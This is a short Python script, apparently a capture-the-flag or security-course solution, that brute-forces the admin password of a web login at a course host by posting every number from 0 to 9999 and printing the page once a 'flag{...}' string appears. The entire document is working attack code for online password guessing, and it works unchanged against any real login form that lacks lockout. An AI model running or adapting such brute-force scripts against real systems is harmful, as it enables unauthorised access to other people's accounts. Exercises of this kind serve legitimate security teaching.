#!/usr/bin/env python3
import re
import requests

def extract_flag_from_string(string):
    match = re.search(r'flag\{[^}]+}', string)
    if match:
        return match.group(0)
    return None

session = requests.Session()
#response = session.get("https://itsec2.franzen.rocks:443")

for pw in range(0, 10000):
    print(pw)
    response = session.post("https://itsec2.franzen.rocks:443/login", data={"username": "admin", "password": pw})
    if extract_flag_from_string(response.text) != None:
        print("This is the HTML we receive when attempting to login with the above credentials:")
        print("--------------------------------------------------------")
        print(response.text)
        print("--------------------------------------------------------")
        print("Flag: " + extract_flag_from_string(response.text))
        break

print("Okay, done brute forcing the password")
